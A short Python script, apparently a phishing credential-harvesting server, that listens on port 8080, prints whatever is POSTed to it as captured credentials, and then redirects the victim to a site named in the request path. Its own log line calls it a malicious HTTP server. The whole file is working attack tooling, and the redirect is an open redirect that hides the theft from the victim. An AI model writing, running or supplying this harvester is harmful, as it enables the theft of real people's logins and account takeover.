import http.server
import socketserver
import urllib.parse

class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        creds = self.rfile.read(content_length).decode('utf-8')
        print("[+] Credentials Captured:\n", creds)

        site = self.path[1:]  # Remove leading '/'
        self.send_response(301)
        self.send_header('Location', urllib.parse.unquote(site))
        self.end_headers()

# Start the server on port 8080
if __name__ == "__main__":
    with socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler) as server:
        print("[*] Malicious HTTP server listening on port 8080...")
        server.serve_forever()
